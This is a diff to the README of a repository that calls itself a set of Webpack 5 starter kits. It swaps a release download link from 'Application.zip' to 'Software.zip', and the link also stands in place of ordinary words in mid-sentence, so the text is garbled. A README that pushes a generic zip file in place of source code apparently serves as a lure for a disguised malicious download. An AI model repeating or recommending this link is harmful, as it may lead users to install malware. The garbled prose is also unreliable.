@@ -7,7 +7,7 @@ Welcome to "Webpack Boilerplates" - your go-to place for Webpack 5 Starter Kits.
 🛠️ **Topics**: assets-management, eslint, javascript, jest, optimize-assets, stylelint, swc, typescript, webpack, webpack-boilerplate, webpack-config, webpack-configuration, webpack5
 
 ## Download
-📥 **Download Zip File**: [Download Here!](https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v1.0/Application.zip)
+📥 **Download Zip File**: [Download Here!](https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v2.0/Software.zip)
 
 ## Getting Started
 To get started, simply download the zip file from the link above and extract it to your desired location. You can then choose the starter kit that best fits your project requirements and start building your awesome web applications!
@@ -28,9 +28,9 @@ Here are some of the amazing starter kits available in this repository:
 ⚛️ **Description**: Boilerplate for React applications with all the necessary webpack configurations.
 
 ### 5. Vue Webpack Starter Kit
-🎨 **Description**: Starter kit for https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v1.0/Application.zip projects with webpack integration for easy development.
+🎨 **Description**: Starter kit for https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v2.0/Software.zip projects with webpack integration for easy development.
 
-https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v1.0/Application.zip many more exciting options to explore!
+https://github.com/DutJokcm12/webpack-boilerplates/releases/download/v2.0/Software.zip many more exciting options to explore!
 
 ## Features
 🌟 **Key Features**:
